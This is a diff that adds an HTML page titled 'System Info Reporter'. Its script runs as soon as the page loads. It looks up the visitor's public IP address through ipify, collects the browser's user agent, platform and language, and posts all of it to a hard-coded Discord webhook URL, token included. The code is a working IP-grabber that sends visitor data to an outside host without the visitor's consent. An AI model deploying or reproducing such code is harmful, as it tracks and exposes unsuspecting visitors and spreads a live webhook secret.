@@ -1,1 +1,41 @@
-no
+<!DOCTYPE html>
+<html>
+<head>
+  <title>System Info Reporter</title>
+</head>
+<body>
+  <h1>Sending System Info...</h1>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1368338544627814430/Y2BpbbnBm5HZhnll0PmOZntyVtDIOrl7xI1-ZePCqDk90h4tB-zPVL5YZ5WdXhY6nnH5";
+
+    // Get public IP
+    fetch("https://api.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ipAddress = data.ip || "Unavailable";
+
+        // Gather limited system info
+        const systemInfo = {
+          "User Agent": navigator.userAgent,
+          "Platform": navigator.platform,
+          "Language": navigator.language,
+        };
+
+        // Build the message
+        let message = "**System Info Report (Web)**\n";
+        message += `**IP Address:** ${ipAddress}\n`;
+        for (const [key, value] of Object.entries(systemInfo)) {
+          message += `**${key}:** ${value}\n`;
+        }
+
+        // Send to Discord webhook
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
+      });
+  </script>
+</body>
+</html>
